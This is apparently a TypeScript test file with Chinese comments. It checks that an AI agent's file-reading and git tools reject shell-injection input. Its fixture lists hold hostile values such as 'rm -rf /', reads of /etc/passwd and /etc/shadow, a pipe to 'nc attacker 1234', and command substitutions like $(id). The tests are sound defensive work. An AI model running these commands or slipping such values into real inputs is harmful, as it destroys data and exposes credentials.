import assert from 'node:assert/strict'
import test from 'node:test'
import { readFileTool } from '../../lib/agent/tools/readFile'
import { gitLog } from '../../lib/agent/tools/gitLog'
import { gitDiff } from '../../lib/agent/tools/gitDiff'

const SHELL_METACHARACTERS = [
  'a.ts; rm -rf /',
  'a.ts && cat /etc/passwd',
  'a.ts | nc attacker 1234',
  'a.ts`whoami`',
  '$(id).ts',
  'a.ts > /tmp/pwned',
  'a.ts < /etc/shadow',
  'a.ts\n rm -rf .',
  'a.ts & background_task',
  'a.ts\0truncated',
]

test('readFile 把 shell 元字符当作字面文件名，不执行任何命令', async () => {
  for (const p of SHELL_METACHARACTERS) {
    const res = await readFileTool({ path: p })
    assert.equal(res.ok, false, `${JSON.stringify(p)} 不该成功`)
    // 关键：失败原因是"路径不存在/被拒绝"，而不是命令被执行
    assert.ok(
      ['NOT_FOUND', 'PATH_DENIED', 'INVALID_INPUT'].includes((res as { code: string }).code),
      `${JSON.stringify(p)} 的拒绝码应为护栏码，实际 ${(res as { code: string }).code}`,
    )
  }
})

test('gitLog 的 path 参数被当作字面路径，不产生命令执行痕迹', async () => {
  for (const p of SHELL_METACHARACTERS) {
    const res = await gitLog({ path: p })

    if (res.ok) {
      // 允许 ok —— 若该路径恰好存在，git 会正常返回该路径的历史。
      // 真正要守的不变量是：结果里不能出现"命令被执行"的证据。
      for (const c of res.commits) {
        // subject 是 GitCommit 的真实字段名（不是 title —— 写错会让断言恒真）
        assert.ok(
          !/root:|passwd|uid=\d+/i.test(c.subject),
          `${JSON.stringify(p)} 疑似被 shell 执行，提交标题：${c.subject}`,
        )
      }
    } else {
      // 失败必须是结构化的护栏码，而不是未捕获异常
      assert.equal(
        typeof (res as { code?: unknown }).code,
        'string',
        `${JSON.stringify(p)} 失败时应返回稳定错误码`,
      )
    }
  }
})

test('gitDiff 的 base/target 经 isSafeRef 校验，注入形态被拒', async () => {
  const INJECTED_REFS = [
    'main; rm -rf /',
    'main && whoami',
    '$(id)',
    'main`id`',
    'HEAD~1 | cat',
    'main > /tmp/x',
    'HEAD\nrm -rf .',
  ]
  for (const ref of INJECTED_REFS) {
    // base 与 target 两个入口都要测：只测一个会漏掉另一条分支
    const onlyBase = await gitDiff({ base: ref })
    assert.equal(onlyBase.ok, false, `base=${JSON.stringify(ref)} 不该被接受`)
    assert.equal(
      (onlyBase as { code?: string }).code,
      'INVALID_INPUT',
      `base=${JSON.stringify(ref)} 应由 isSafeRef 拒绝，而不是别的错误`,
    )

    const both = await gitDiff({ base: 'HEAD', target: ref })
    assert.equal(both.ok, false, `target=${JSON.stringify(ref)} 不该被接受`)
    assert.equal(
      (both as { code?: string }).code,
      'INVALID_INPUT',
      `target=${JSON.stringify(ref)} 应由 isSafeRef 拒绝`,
    )
  }
})